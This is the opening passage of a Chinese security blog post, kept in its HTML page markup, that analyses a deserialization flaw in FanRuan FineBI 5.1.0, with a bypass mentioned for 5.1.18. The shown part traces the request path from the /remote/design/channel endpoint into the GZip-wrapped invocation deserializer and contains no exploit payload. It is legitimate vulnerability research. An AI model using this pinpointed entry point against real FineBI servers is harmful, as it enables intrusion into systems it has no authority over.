wvc3ZnPg==">
<meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">
<meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">
<meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">
<meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">
<meta property="og:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">
<meta property="og:updated_time" content="2025-05-26T14:01:35.620Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="帆软channel接口反序列化漏洞分析">
<meta name="twitter:description" content="环境fineBi 5.1.0 fineBi5.1.18（绕过） 漏洞分析漏洞接口为/webroot/decision/remote/design/channel，在fine-decision-report-10.0.jar中，接口对应com.fr.decision.extension.report.api.remote.RemoteDesignResource类的onMessage方法。 在onM">
<meta name="twitter:image" content="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==">





  
  
  <link rel="canonical" href="https://fanygit.github.io/2024/03/06/帆软channel接口反序列化漏洞分析/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  
  <title>帆软channel接口反序列化漏洞分析 | Fan的小酒馆</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>


</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Fan的小酒馆</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          <a href="javascript:;" class="popup-trigger">
          
            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
      

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://fanygit.github.io/2024/03/06/帆软channel接口反序列化漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Fany">
      <meta itemprop="description" content="路虽远，行则必达。">
      <meta itemprop="image" content="/images/tx5.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Fan的小酒馆">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">帆软channel接口反序列化漏洞分析

              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2024-03-06 16:41:00" itemprop="dateCreated datePublished" datetime="2024-03-06T16:41:00+08:00">2024-03-06</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2025-05-26 22:01:35" itemprop="dateModified" datetime="2025-05-26T22:01:35+08:00">2025-05-26</time>
              </span>
            
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>

                
                
                  ，
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/漏洞分析/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a></span>

                
                
              
            </span>
          

          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
                 阅读次数： 
                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
              </span>
            </span>
          

          
            
  
  <span class="post-meta-item">
    
    <span class="post-meta-item-icon">
      <i class="fa fa-comment-o"></i>
    </span>
    
      <span class="post-meta-item-text">评论数：</span>
    
  
    <a href="/2024/03/06/帆软channel接口反序列化漏洞分析/#comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2024/03/06/帆软channel接口反序列化漏洞分析/" itemprop="commentCount"></span>
    </a>
  </span>
  
  
          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>fineBi 5.1.0</p>
<p>fineBi5.1.18（绕过）</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞接口为<code>/webroot/decision/remote/design/channel</code>，在<code>fine-decision-report-10.0.jar</code>中，接口对应<code>com.fr.decision.extension.report.api.remote.RemoteDesignResource</code>类的<code>onMessage</code>方法。</p>
<p>在<code>onMessage</code>方法中，获取<code>request</code>中的输入流，以此作为参数调用<code>WorkContext.handleMessage</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304093811133.png" alt="image-20240304093811133"></th>
</tr>
</thead>
</table>
<p>在<code>com.fr.workspace.WorkContext</code>的<code>handleMessage</code>方法中，调用了<code>messageListener.handleMessage(var0)</code>。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304094231887.png" alt="image-20240304094231887"></th>
</tr>
</thead>
</table>
<p>会调用到<code>com.fr.workspace.engine.rpc.WorkspaceServerInvoker</code>的<code>handleMessage</code>方法，在该方法中调用当前类的<code>deserializeInvocation</code>方法。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304094429259.png" alt="image-20240304094429259"></th>
</tr>
</thead>
</table>
<p>在<code>deserializeInvocation</code>方法中，调用了<code>SerializerHelper.deserialize</code>来对<code>request</code>输入流进行反序列化，传入两个参数，一个是输入流，一个是<code>Serializer</code>对象。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304094613546.png" alt="image-20240304094613546"></th>
</tr>
</thead>
</table>
<p><code>Serializer</code>对象是通过以<code>InvocationSerializer.getDefault()</code>作为参数调用<code>GZipSerializerWrapper.wrap</code>方法获取。</p>
<p><code>InvocationSerializer.getDefault()</code>方法是创建<code>InvocationSerializer</code>对象。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304094915323.png" alt="image-20240304094915323"></th>
</tr>
</thead>
</table>
<p><code>GZipSerializerWrapper.wrap</code>方法是创建<code>GZipSerializerWrapper</code>对象，并且将<code>InvocationSerializer</code>对象作为<code>this.serializer</code>的值。</p>
<table>
<thead>
<tr>
<th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20240304095019369.png" alt="image-20240304095019369"></th>
</tr>
</thead>
</table>
<p>接着调用<code>SerializerHelper.deserialize</code>来对<code>request</code>输入流进行反序列化，这里的<code>var1</code>为<code>GZipSerializerWrapper</code>对象，将会调用<code>GZipSerializerWrapper</code>的<code>deserialize</code>方法。</p>
<table>
<thead>
<tr>
